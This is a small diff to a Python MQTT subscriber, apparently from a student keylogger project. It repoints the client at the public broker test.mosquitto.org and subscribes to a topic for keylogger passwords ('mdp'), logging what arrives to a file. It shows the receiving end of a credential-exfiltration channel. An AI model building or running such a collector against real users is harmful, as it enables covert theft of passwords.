@@ -2,8 +2,8 @@ import time
 
 import paho.mqtt.client as mqtt
 
-HOST = "localhost"
-PORT = 5204
+HOST = "test.mosquitto.org"
+PORT = 1883
 file = f"log_{time.time()}.txt"
 
 
@@ -22,7 +22,7 @@ except:
     exit()
 
 try:
-    client.subscribe('MDP', qos=2)
+    client.subscribe('test/projet/keylogger/mdp', qos=2)
     client.loop_forever()
 
 
